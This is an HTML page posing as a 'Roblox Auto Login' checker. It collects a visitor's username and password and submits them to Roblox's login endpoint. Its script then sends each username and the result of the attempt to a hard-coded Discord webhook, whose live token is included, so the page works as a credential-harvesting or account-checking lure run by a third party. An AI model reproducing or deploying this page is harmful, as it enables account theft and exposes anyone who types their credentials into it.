<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Roblox Auto Login</title>
</head>
<body>
<h2>Login Checker</h2>
<input id="username" placeholder="Username">
<input id="password" type="password" placeholder="Password">
<button onclick="checkLogin()">Login</button>
<p id="status"></p>

<script>
const successWebhook = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";
const failedWebhook = "https://discord.com/api/webhooks/1393508497299345448/KdIyKVOnH1HY7sNXot68neET1pVVzVD4AC9EfQrv3W5sxhsPW2WC2ouO5eOfaQBq-eSM";

async function checkLogin() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const statusEl = document.getElementById("status");
    statusEl.textContent = "⏳ Checking...";

    try {
        // Roblox login request
        const response = await fetch("https://auth.roblox.com/v2/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cusername: username, password: password })
        });

        const data = await response.json();

        if (data.user) {
            statusEl.textContent = "✅ Login Successful!";
            await fetch(successWebhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `✅ Success\nUser: ${username}` }) });
            window.location.href = "https://www.roblox.com/home"; // optional
        } else {
            statusEl.textContent = "❌ Login Failed!";
            await fetch(failedWebhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `❌ Failed\nUser: ${username}` }) });
        }

    } catch (err) {
        console.error(err);
        statusEl.textContent = "❌ Error connecting to Roblox!";
    }
}
</script>
</body>
</html>
